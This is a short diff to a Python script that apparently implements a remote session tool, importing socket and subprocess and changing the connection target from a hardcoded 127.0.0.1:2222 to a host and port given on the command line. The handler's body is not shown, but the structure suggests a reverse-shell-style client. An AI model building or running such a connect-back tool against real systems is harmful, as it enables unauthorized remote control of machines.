@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import os
+import sys
 
 
 def session_handler():
@@ -45,8 +46,6 @@ def session_handler():
 
 # generate the socket handler for our code
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# target host
-host_ip = '127.0.0.1'
-host_port = 2222
+host_ip = sys.argv[1]
+host_port = int(sys.argv[2])
 session_handler()
